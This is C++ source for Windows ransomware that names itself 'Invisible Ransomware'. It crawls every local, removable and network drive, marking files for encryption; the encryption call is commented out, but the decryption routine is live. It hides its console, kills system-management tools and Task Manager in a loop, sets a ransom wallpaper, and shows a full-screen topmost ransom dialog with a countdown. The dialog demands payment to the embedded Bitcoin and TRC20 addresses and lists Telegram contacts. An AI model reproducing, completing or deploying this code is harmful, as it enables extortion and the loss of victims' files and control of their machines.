// ransom.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>
#include <stdexcept>
#include <tlhelp32.h>
#include <Shlobj.h>
#include <WinUser.h>
#include "resource.h"

#pragma comment (lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "Shell32.lib")

#include "Cryptographic.h"

//global variables
//wchar_t readMeTxtFilename[] = L"InvisibleReadMe.txt";
char descriptionText[] = "Greetings.\nWe are Doubleface Team who controls the world...\nAll your files have been encrypted by our Invisible Ransomware.\nPlease never try to recover your files without correct decryption key.\nI will give you after your pay.\nYour files can be disappeared forever on your PC.\nYou should follow my words.\nPay ($120000)($12k)(2BTC) to below addresses.\n\nOur Team's here : https://t.me/doubleface_group\n@madoneputain (https://t.me/madoneputain)\n@tombezyy (https://t.me/tombezyy)\n@moonnight_god (https://t.me/moonnight_god)\n@WalterBishop42 (https://t.me/WalterBishop42)\n@te1egram_usr (https://t.me/te1egram_usr)\n@Britannique (https://t.me/Britannique)\n@tcpsnow (https://t.me/tcpsnow)\n@masturbateur (https://t.me/masturbateur)\n@xpolarized (https://t.me/xpolarized)\n@shiro_SATA (https://t.me/shiro_SATA)\n\nYou can find anywhere our team.\nWe always welcome you and your payment.\n";
//This is for encryption functions
uint8 uin[] = "cb5664c46c5b5fcc71aa1bd373f0955ff2d60a2971e7315f0e8298b16dfeec60879c91e5c143b04d44d84eabba74ac05c40e7169e3a051db5d3912ec27ef09abd8c64a61a73a5b4cf276c69934866673c6f3aa948f1d89ceaf4dcbda5d98ee5200551c90ff55b65f71e7a4c116f799591ba3fe4b268003d4e69ef6e0cc4e6c570880e45e006bc30f1f74e963b761d7c629e3b72001aae6f37da7d4932e7fb6c80bb48008ec59351d277a3377babcae944a06f9fa210be732c7b016935f19dbc184223a92d5e0b4b22cd5433ba8275d31f4ddb7fa8a4f3ef85336a9857a364fc309859c47a5af65fb8e2535d50e8ab6a5c50635df8a27484148e5b6d3a1af4be98ff9f23dd47250b90af514cd1c5125fd85f33cc4924cc4057f79995281b609ec3fd3ce8bbfee09d1a0b7d7481b9cca84cf406dae06fe4e23d30aa7d0fc27268fb9693d15f2e095cd969ef25d54e9b5ee06e9e1d1528dfab558a08ced53e047283938a2f4f8bdbb5d3b5203f3a9d01b0f75094a1637dbe26d3a73264fb7e5458c6651baf6efb3a36c0f336df76bade318dffa94dc5e37b4aaf3f96c2b72de5e4554eea7ea2824dbe25bc4c92a781a0cfaf8c3196055ed42075363a755b715a8f581d13c40a340e949cb1d7ab42b3f675e86b8bb8993e06f46edaf706d3ee51f83d564af0a68adc9d28bceb6f2c5df1e42699156b810a62404b34e1cc3fc0b6299";
uint8 uie[] = "10001";
uint8 uip[] = "fc99bb1c28a5ae006e567faf4cfc0d707c1528e2edb6710ac3396da29026e99fd2659403afa3d9e3ee04fdba370978ee8ec396a20c3750bcde1366398191c0af3ea90521e37d7b0ac20020a2ede80875b2d4f82553c0427d09a7e2b93a79d813f83ec690bc8acc0b6323a28167f0f69d60230685bda880e6bdcf973cb337696579fc8f67332304804845396e9c7978fe118678d93f473f8d71603fd9e222aa3c38ba17be3fa05a00e93d9e8084dcc6303cd50539d3f7ba0b9e3590a8c193d430ad5118add9580722bee389d118711acc5ae966bd700e28f8ba2443c047e11fd85198484df8a343804011b2784f8fab68e19a537e0ee4c0ed3f050f3b6d65cb81";
uint8 uiq[] = "ce12f0967bd216d248cafda3d46ad1368d9f3de1243c4a3290ab7b3648d4280dbb4c1aad12c066f428a28df3c814d3782814dedba4e7910cbeca29dc55d5978a23321f8f7a7e31ad417d86342c037d963a21b62d728eee49e0571c7fcdc9cb2f3c9cb956ac63af940a32a27ff69009293a9f7fee86889b826f2a0e38a805fc9681639f199fc81843fc9a97ed2013adc9a065ef38d62ece4de11db520dfe46256675f88ef4b04a4518e8d1e94a2e3a20fe54cbf225cd7c043b006ca4d69bb350768672df2a9708a5638e2ef8e72582091802ba7c30fdba9fd54bd04d93ee5ac41fb544639b06404ea7272c1f28acc5fe9e9dc5f35e894c112431b1ddb57b80319";
uint8 uidP[] = "b9802be881f129d727305e945df4bbe9df35aad0fbc0ff42e81b44681d74761ce865b04d04af4f54137796dd298dcb4165963d08c3efdb5ad7bb6756d3d035b07c53a3713f9ee6bcffbb183c8e79d7bc9797cea39add95f63d210d5ef992811c2931f0a059d59402c8cb628ba5c94f5243477582c1c4fce4767ffc90970c1a5a6b3b0e14bb78fbd5393d9cef9df996e0fdfdc2c1c7b68af5544d5a96a77acd896c1f3d50796948af6299ddcc83c59dc5cee6a0efd6ba15e67248e3f30a35859e39a9547657264e173617e31daad564d8adeab98864c20154a75dfa633a6618fcc2ef122a306db52479e88527d545ac9b5911fc3e96b166fcd34ae3e4c0720100";
uint8 uidQ[] = "71f6516cb72f1905d3d1c6711aa0b3f07a638d21fc1b07616d5617fe8e4a1d98727304f19fc41d6b7b29625d65d1f69ca575dd4514ae272e2838beeba5e0483cd177ffb22628b1aa41e47c1a5018e213f933f97eaab2d69eae5d1e5aa360ac68041a1bf90dbed733846c3a27902059a09e55e4b6f1598cbe96616899f679d1151e9b0c3a6c7d88c5d8655a0d7dc6c43e13e12b69803144501765896c93c4c6894803b243bb75e6b55fa3353d37d3b1251f46d110dccd47fb66d66a7c63336f811840af4d5a5ced73ff63a8dd5ae8d7a1ff82a4f51fc8f7fa2c29980bd857c56a7be6402bd91b87086ca0801774a0cf8e19919069cca4af1d3d553aaeb994fec9";
uint8 uiQInv[] = "f1ef56e2c0e9babc7b27356a01535d052a8dfd5a61bbdbded4e9ffa34e054b43e162738660d46be1cc509076c958f336ae0a0f88ba54e03168fcf1315fa8c45033ccca8ef2bd878203621969031c3b4548633f70bc64b1885f68b6842bbbae40c88da40b07ecea95122eabeeb36998f9bf75927e8c5bce7fba7942ea04e0039d85a0577170a0be52dd8ad75aaf3203848d49152ccc9919db4f941752a3c164592251364ef14a78f90ac6c9357f955270567591d6eb45a0a88c40f43d38b80289fdc4c15888fb8df9ca90f5b14c846fd827d33d0a5029e6d75cbd14a65d3674b6443dfdfa4d72642e51bee915bfda4c04b85572cecdafecec4b6399fe196ac5b7";

HANDLE hThreads[30];
int iCnt = 0;
bool isEncrypting = true;
int workingDrvCnt = 0;

DWORD WINAPI Thread_Process() {

	while (TRUE) {
		//WinExec("cmd.exe /c taskkill /f /im explorer.exe /t", SW_HIDE);
		WinExec("cmd.exe /c taskkill /f /im mmc.exe /t", SW_HIDE);
		HWND taskManagerWindow = FindWindowA("TaskManagerWindow", NULL);
		if (taskManagerWindow) {
			PostMessage(taskManagerWindow, WM_CLOSE, 0, 0);
		}
		Sleep(1000);
	}
	return -1;
}

wchar_t make_uppercase(wchar_t c) {
	return c >= 'a' && c <= 'z' ? c - 32 : c;
}

/// <summary>
/// This is thread function that encrypts and decrypts by settings
/// </summary>
/// <param name="chDrivePath"></param>
/// <param name="ext"></param>
void CrypterDrive(wchar_t* chDrivePath, wchar_t mode) {

	if (mode == 'e' && !isEncrypting) {
		return;
	}

	WIN32_FIND_DATA FileData;
	HANDLE hSearch;
	wchar_t chPath[MAX_PATH * 10] = { 0 };
	wchar_t _dot[] = L"..";

	if (wcslen(chDrivePath) > 3 * MAX_PATH)
		return;

	wchar_t sysPath[MAX_PATH], sysUsersDir[MAX_PATH];
	GetSystemDirectory(sysPath, MAX_PATH);
	if (make_uppercase(sysPath[0]) == make_uppercase(chDrivePath[0])) {
		chDrivePath[0] = make_uppercase(chDrivePath[0]);
		wsprintf(sysUsersDir, L"%c:\\%s\\", sysPath[0], L"Users");
		if (wcsncmp(chDrivePath, sysUsersDir, wcslen(sysUsersDir)) != 0) {
			CrypterDrive(sysUsersDir, mode);
			return;
		}
		if (GetFileAttributes(chDrivePath) & FILE_ATTRIBUTE_HIDDEN)
			return;
	}


	wsprintf(chPath, L"%s*.*", chDrivePath);

	hSearch = FindFirstFile(chPath, &FileData);
	if (hSearch == INVALID_HANDLE_VALUE)
		return;

	do {

		if (wcslen(FileData.cFileName) > 255 ||
			FileData.dwFileAttributes == FILE_ATTRIBUTE_SYSTEM ||
			FileData.dwFileAttributes == FILE_ATTRIBUTE_VIRTUAL) // if length > 255 or it is system file
			continue;

		//-----------------------------------------------------------------//
		if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)   // if it is directory
		{

			if (!wcscmp(FileData.cFileName, _dot + 1) ||
				!wcscmp(FileData.cFileName, _dot))
				continue;

			chPath[0] = 0;

			wcscat_s(chPath, 3 * MAX_PATH, chDrivePath);
			wcscat_s(chPath, 3 * MAX_PATH, FileData.cFileName);
			wcscat_s(chPath, 3 * MAX_PATH, L"\\");

			CrypterDrive(chPath, mode);
		}
		else // if this is a file
		{
			chPath[0] = 0;

			wcscat_s(chPath, 3 * MAX_PATH, chDrivePath);
			wcscat_s(chPath, 3 * MAX_PATH, FileData.cFileName);

			/*if (wcsstr(chPath, readMeTxtFilename))
				continue;*/

			if (mode == 'e') {
				if (!wcsstr(chPath, EXT_STRING)) {
					//EncFile(chPath, uin, uie);
					wprintf(L"Encrypting File : %s\n", chPath);
				}
			}
			else if (mode == 'd') {
				if (wcsstr(chPath, EXT_STRING) ) {
					DecFile(chPath, uin, uie, uip, uiq, uidP, uidQ, uiQInv);
					wprintf(L"Decrypting File : %s\n", chPath);
				}
			}
		}
		Sleep(10);
	} while (FindNextFile(hSearch, &FileData));

	/*chPath[0] = 0;
	wcscat_s(chPath, 3 * MAX_PATH, chDrivePath);
	wcscat_s(chPath, 3 * MAX_PATH, readMeTxtFilename);*/

	/*if (mode == 'e') {
		FILE* fp = _wfopen(chPath, L"wb");
		if (fp) {
			for (int i = 0; i < 2048; i++) {
				if (readmeTxt[i] == 0x00)
					break;
				fwrite(&readmeTxt[i], 1, 1, fp);
			}
			fclose(fp);
		}
	}
	else if (mode == 'd') {
		DeleteFile(chPath);
		_wremove(chPath);
	}*/
	FindClose(hSearch);
}

DWORD Thread_Main(PVOID lp) {

	wchar_t* pags = (wchar_t*)lp;
	wchar_t chDrive = pags[0];	//this is for which drive to be crypter
	wchar_t mode = pags[1];		//this is for encrypt or decrypt
	wchar_t chDrivePath[MAX_PATH];

	chDrivePath[0] = chDrive;
	chDrivePath[1] = ':';
	chDrivePath[2] = '\\';
	chDrivePath[3] = 0;

	while (TRUE) {
		if (!isEncrypting) {
			CrypterDrive(chDrivePath, 'd');
			workingDrvCnt--;
			break;
		}
		else {
			CrypterDrive(chDrivePath, 'e');
		}
		Sleep(1000);
	}


	return 0;
}

/// <summary>
/// thread for showing dialog
/// </summary>
/// <param name="hwndDlg"></param>
/// <param name="uMsg"></param>
/// <param name="wParam"></param>
/// <param name="lParam"></param>
/// <returns></returns>

void decryptKey(char* key) {
	char str[] = "abcdefghijklmnopqrstuvwxyz0123456789";

	for (int j = 0; uip[j]; j++) for (int i = 0; key[i]; i++)	if (uip[j] == key[i]) { uip[j] = str[i]; break; }
	for (int j = 0; uiq[j]; j++)	for (int i = 0; key[i]; i++)	if (uiq[j] == key[i]) { uiq[j] = str[i]; break; }
	for (int j = 0; uidP[j]; j++)	for (int i = 0; key[i]; i++)	if (uidP[j] == key[i]) { uidP[j] = str[i]; break; }
	for (int j = 0; uidQ[j]; j++)	for (int i = 0; key[i]; i++)	if (uidQ[j] == key[i]) { uidQ[j] = str[i]; break; }
	for (int j = 0; uiQInv[j]; j++)	for (int i = 0; key[i]; i++)	if (uiQInv[j] == key[i]) { uiQInv[j] = str[i]; break; }

	printf("%s\nuip=%s\n", key, uidQ);
}

int timeLeft = 0;
int descriptionHeight = 0;
char timeTxtPath[MAX_PATH];
char homeDir[MAX_PATH];
int timerCount = 0;

INT_PTR CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam) {

	switch (uMsg) {
	case WM_INITDIALOG: {

		int screen_width = GetSystemMetrics(SM_CXSCREEN);
		int screen_height = GetSystemMetrics(SM_CYSCREEN);
		descriptionHeight = screen_height - 100;
		SetWindowPos(hwndDlg, HWND_TOPMOST, 0, 0, screen_width, screen_height, SWP_SHOWWINDOW);

		SetWindowPos(GetDlgItem(hwndDlg, IDC_COPY_BTC), NULL, screen_width /2 + 10 , screen_height - 45, 320, 45, SWP_NOSIZE | SWP_NOZORDER);
		SetWindowPos(GetDlgItem(hwndDlg, IDC_BTCTEXT), NULL, screen_width /2 + 10, screen_height - 80, 320, 45, SWP_NOSIZE | SWP_NOZORDER);


		SetWindowPos(GetDlgItem(hwndDlg, IDC_COPY_TRC20), NULL, screen_width /2 - 320, screen_height - 45, 320, 45, SWP_NOSIZE | SWP_NOZORDER);
		SetWindowPos(GetDlgItem(hwndDlg, IDC_TRCTEXT), NULL, screen_width / 2 - 320, screen_height - 80, 320, 45, SWP_NOSIZE | SWP_NOZORDER);

		SetWindowPos(GetDlgItem(hwndDlg, IDC_DEC_KEY_INPUT), NULL, screen_width / 2 - 240, screen_height / 2 + 50, 320, 50, SWP_NOSIZE | SWP_NOZORDER);
		SetWindowPos(GetDlgItem(hwndDlg, IDC_DECRYPT), NULL, screen_width / 2 + 110, screen_height / 2 + 50, 100, 45, SWP_NOSIZE | SWP_NOZORDER);

		SetTimer(hwndDlg, 3456, 1000, NULL);


		SetWindowLong(hwndDlg, GWL_EXSTYLE, GetWindowLong(hwndDlg, GWL_EXSTYLE) | WS_EX_LAYERED);
		SetLayeredWindowAttributes(hwndDlg, 0, 215, LWA_ALPHA);

		return TRUE;
	}break;
	case WM_CTLCOLORSTATIC:
		SetTextColor((HDC)wParam, RGB(255, 0, 0));
		SetBkMode((HDC)wParam, TRANSPARENT);
		return (LRESULT)GetStockObject(HOLLOW_BRUSH);
		break;
	case WM_TIMER: {
		if (wParam == 3456) {
				timerCount = 0;
				if (!isEncrypting && workingDrvCnt == 0) {

					KillTimer(hwndDlg, 3456);

					char filePath[MAX_PATH];
					char homeDir[MAX_PATH];
					SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, homeDir);
					sprintf(filePath, "%s\\dec_key.dat", homeDir);
					remove(filePath);
					sprintf(filePath, "%s\\time.dat", homeDir);
					remove(filePath);

					MessageBox(NULL, L"Decryption Completed!Bye!See you later!", L"Decrypt Completed!", NULL);
					exit(1);
				}
				FILE* rfp = fopen(timeTxtPath, "r");
				if (rfp) {
					char line[128];
					fgets(line, 128, rfp);
					timeLeft = atoi(line);
					fclose(rfp);
				}
				if (timeLeft > 0) {
					timeLeft--;
					FILE* wfp = fopen(timeTxtPath, "w");
					if (wfp) {
						char writeTxt[128];
						sprintf(writeTxt, "%d", timeLeft);
						fwrite(writeTxt, 1, strlen(writeTxt), wfp);
						fclose(wfp);
					}
				}

			/*if (descriptionHeight <= -500) {
				int screen_height = GetSystemMetrics(SM_CYSCREEN);
				descriptionHeight = screen_height - 100;
			}
			descriptionHeight -= 5;*/
			InvalidateRect(hwndDlg, NULL, FALSE);
		}
	}break;
	case WM_PAINT: {
		int screen_width = GetSystemMetrics(SM_CXSCREEN);
		int screen_height = GetSystemMetrics(SM_CYSCREEN);
		if (isEncrypting) {
			PAINTSTRUCT ps;
			HDC hdc = BeginPaint(hwndDlg, &ps);
			HDC memDC = CreateCompatibleDC(hdc);

			RECT clientRect;
			GetClientRect(hwndDlg, &clientRect);

			HBITMAP bmp = CreateCompatibleBitmap(hdc,
				clientRect.right - clientRect.left,
				clientRect.bottom - clientRect.top);
			HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, bmp);

			HBRUSH hYellowBrush = CreateSolidBrush(RGB(255, 255, 0));
			FillRect(memDC, &clientRect, hYellowBrush);

			SetBkMode(memDC, TRANSPARENT);

			HFONT hFont;
			hFont = CreateFontA(200, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
			SelectObject(memDC, hFont);

			SetTextColor(memDC, RGB(0, 0, 0));
			TextOutA(memDC, 400, 150, "invisible.", 10);

			hFont = CreateFontA(50, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
			SelectObject(memDC, hFont);
			SetTextColor(memDC, RGB(255, 255, 255));
			TextOutA(memDC, 700, 350, "ransomware", 10);

			SetTextColor(memDC, RGB(255, 0, 255));

			RECT textRect;
			SetRect(&textRect, 10, screen_height - 80, 210, screen_height);

			hFont = CreateFontA(60, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
			SelectObject(hdc, hFont);

			char timeTxt[128];
			sprintf(timeTxt, "%02d:%02d:%02d", timeLeft / 3600, (timeLeft % 3600) / 60, timeLeft % 60);
			DrawTextA(memDC, timeTxt, -1, &textRect, DT_SINGLELINE | DT_VCENTER | DT_CENTER);

			hFont = CreateFontA(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
			SelectObject(memDC, hFont);
			SetTextColor(memDC, RGB(136, 0, 20));
			//SetRect(&textRect, screen_width - 500, descriptionHeight, screen_width, descriptionHeight + 600);
			SetRect(&textRect, screen_width - 500, 50, screen_width, 600);
			DrawTextA(memDC, descriptionText, strlen(descriptionText), &textRect, DT_LEFT | DT_TOP | DT_WORDBREAK);


			hFont = CreateFontA(60, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
			SelectObject(memDC, hFont);
			SetTextColor(memDC, RGB(63, 72, 204));
			TextOutA(memDC,screen_width / 2 - 210, screen_height / 2 - 20, "INPUT KEY HERE", 15);

			HDC hMemDC = CreateCompatibleDC(memDC);
			HBITMAP g_hBitmap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BITMAP1));
			SelectObject(hMemDC, g_hBitmap);
			BITMAP bm;
			GetObject(g_hBitmap, sizeof(bm), &bm);
			StretchBlt(memDC, 50, 100, 300, 300, hMemDC, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);

			BitBlt(hdc, 0, 0, clientRect.right - clientRect.left,
				clientRect.bottom - clientRect.top, memDC, 0, 0, SRCCOPY);

			SelectObject(memDC, oldBmp);
			DeleteObject(bmp);
			DeleteDC(memDC);

			EndPaint(hwndDlg, &ps);
		}
		else {
			ShowWindow(GetDlgItem(hwndDlg, IDC_DEC_KEY_INPUT), SW_HIDE);
			ShowWindow(GetDlgItem(hwndDlg, IDC_DECRYPT), SW_HIDE);
			PAINTSTRUCT     ps;
			HDC             hdc;
			HDC             memDC;
			HGDIOBJ         oldBitmap;

			hdc = BeginPaint(hwndDlg, &ps);
			memDC = CreateCompatibleDC(hdc);

			SetTextColor(hdc, RGB(255, 0, 255));
			SetBkMode(hdc, TRANSPARENT);
			RECT textRect;
			SetRect(&textRect, 10, screen_height - 80, 310, screen_height);

			HFONT hFont;
			hFont = CreateFontA(60, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
			SelectObject(hdc, hFont);

			DrawTextA(hdc, "Decrypting...", -1, &textRect, DT_SINGLELINE | DT_VCENTER | DT_CENTER);

			SelectObject(memDC, oldBitmap);
			DeleteDC(memDC);

			EndPaint(hwndDlg, &ps);
		}
	}break;
	case WM_COMMAND:
		switch (LOWORD(wParam)) {
		case IDOK:
			break;
		case IDCANCEL:
			break;
		case IDC_DECRYPT:
			if (MessageBox(hwndDlg, L"Is this right key? If not, you can't recover your files forever!", L"Start Decryption",
				MB_YESNO | MB_ICONQUESTION) == IDYES) {
				char decryptionKey[37] = { 0 };
				GetDlgItemTextA(hwndDlg, IDC_DEC_KEY_INPUT, decryptionKey, _countof(decryptionKey));
				if (strlen(decryptionKey) != 36) {
					MessageBoxA(NULL, "Decryption Key is not correct!", NULL, NULL);
					break;
				}
				decryptKey(decryptionKey);
				isEncrypting = FALSE;

				char decKeyTxtPath[MAX_PATH];
				char homeDir[MAX_PATH];
				SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, homeDir);
				sprintf(decKeyTxtPath, "%s\\dec_key.dat", homeDir);
				FILE* fp = fopen(decKeyTxtPath, "w");
				if (fp) {
					fwrite(decryptionKey, 1, 36, fp);
					fclose(fp);
				}
			}
			break;
		case IDC_COPY_BTC: {
			const char* output = "1Phi31TbzbAm9bJGUYhHG86jXoN3BMZ6Qn";
			const size_t len = strlen(output) + 1;
			HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
			memcpy(GlobalLock(hMem), output, len);
			GlobalUnlock(hMem);
			OpenClipboard(0);
			EmptyClipboard();
			SetClipboardData(CF_TEXT, hMem);
			CloseClipboard();
		}break;
		case IDC_COPY_TRC20: {
			const char* output = "TBaRWY2dyRb56dcAFzMKDZSTkbfCZSmkqX";
			const size_t len = strlen(output) + 1;
			HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
			memcpy(GlobalLock(hMem), output, len);
			GlobalUnlock(hMem);
			OpenClipboard(0);
			EmptyClipboard();
			SetClipboardData(CF_TEXT, hMem);
			CloseClipboard();
		}break;
		}
		break;
	}
	return FALSE;
}

DWORD WINAPI Thread_ShowDialog(LPVOID lp) {

	while (TRUE) {
		DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG1), NULL, DialogProc);
	}
	return 0;
}

void createThreads() {

	char decKeyTxtPath[MAX_PATH];
	char homeDir[MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, homeDir);
	sprintf(decKeyTxtPath, "%s\\dec_key.dat", homeDir);
	FILE* fp = fopen(decKeyTxtPath, "r");
	if (fp) {
		char decKey[37];
		fread(&decKey[0], 1, 36, fp);
		decKey[36] = 0;
		decryptKey(decKey);
		isEncrypting = FALSE;
		fclose(fp);
	}

	wchar_t ch = 'a';
	wchar_t szDrive[10] = L"c:\\";
	while (ch <= 'z')
	{
		szDrive[0] = ch;

		switch (GetDriveType(szDrive))
		{
		case DRIVE_REMOVABLE:
		case DRIVE_FIXED:
		case DRIVE_REMOTE:
		{
			// Create the main thread...
			wchar_t* arg = new wchar_t[2];
			wsprintf(arg, L"%c%c", ch, 'e');      //set mode for encrypt
			hThreads[iCnt++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread_Main, arg, 0, 0);
			workingDrvCnt++;
			break;
		}
		default:break;
		}
		ch++;
	}

	WaitForMultipleObjects(iCnt, hThreads, TRUE, INFINITE);
}

/// <summary>
/// Change system wallpaper
/// </summary>
/// <returns></returns>


BOOL SaveBitmapToFile(HBITMAP hBitmap, const wchar_t* filePath) {
	try {
		HRSRC hrsrc = FindResource(NULL, MAKEINTRESOURCE(IDB_BITMAP_WALLPAPER), RT_BITMAP);
		HGLOBAL hLoaded = LoadResource(NULL, hrsrc);
		LPVOID lpLock = LockResource(hLoaded);
		DWORD dwSize = SizeofResource(NULL, hrsrc);
		HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD dwByteWritten;

		//Write BITMAPFILEHEADER
		BITMAPFILEHEADER bfh;
		bfh.bfType = 0x4d42;
		bfh.bfSize = dwSize + sizeof(BITMAPFILEHEADER);
		bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
		bfh.bfReserved1 = bfh.bfReserved2 = 0;
		WriteFile(hFile, &bfh, sizeof(bfh), &dwByteWritten, NULL);

		WriteFile(hFile, lpLock, dwSize, &dwByteWritten, NULL);
		CloseHandle(hFile);
		FreeResource(hLoaded);
	}
	catch (const std::exception& e) {
		printf("error set wallpaper");
		return FALSE;
	}
	return TRUE;
}

void setWallpaper() {
	HBITMAP hBitmap = (HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BITMAP_WALLPAPER), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
	if (hBitmap) {
		wchar_t tmpPath[MAX_PATH];
		GetTempPath(MAX_PATH, tmpPath);
		wchar_t filePath[MAX_PATH];
		wsprintf(filePath, L"%s\\tmp.bmp", tmpPath);
		if (SaveBitmapToFile(hBitmap, filePath)) {
			if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)filePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
				wprintf(L"Wallpaper set successfully.\n");
			}
			else {
				wprintf(L"Failed to set wallpaper.\n");
			}
		}
		else {
			wprintf(L"Failed to save bitmap to file.\n");
		}
		DeleteObject(hBitmap);
	}
	else {
		wprintf(L"Failed to load bitmap from resource.\n");
	}
}

int main()
{
	SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, homeDir);
	sprintf(timeTxtPath, "%s\\time.dat", homeDir);
	timeLeft = 18000;

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	setWallpaper();

	iCnt = 0;
	hThreads[iCnt++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread_ShowDialog, 0, 0, 0);
	hThreads[iCnt++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread_Process, 0, 0, 0);

	createThreads();

	return 0;
}
